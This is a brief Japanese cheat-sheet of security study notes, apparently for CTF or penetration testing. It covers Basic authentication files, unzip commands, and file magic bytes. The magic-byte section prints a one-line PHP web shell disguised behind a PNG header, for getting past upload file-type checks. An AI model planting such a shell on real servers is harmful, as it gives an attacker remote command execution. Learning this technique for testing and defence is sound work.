## basic認証とは
Webサイトの特定のページやファイルへのアクセスをIDとパスワードで制限する認証方式。
`/var/www/html/.htaccess`で有効化し、`/var/www/html/.htpasswd`でIDとハッシュ化したパスワードを設定する。

## zipファイル
```bash
unzip <ファイル>
7z x <ファイル>
```

## Magic Byteとは
Webサーバーがファイル形式を判断する際の先頭の数バイト、拡張子を偽装してもこれがないと画像ファイルとして認識しないことがある。
```bash
printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php.png # PNGファイル
echo 'FFD8FFDB' | xxd -r -p > shell.php.jpg # JPEGファイル
```
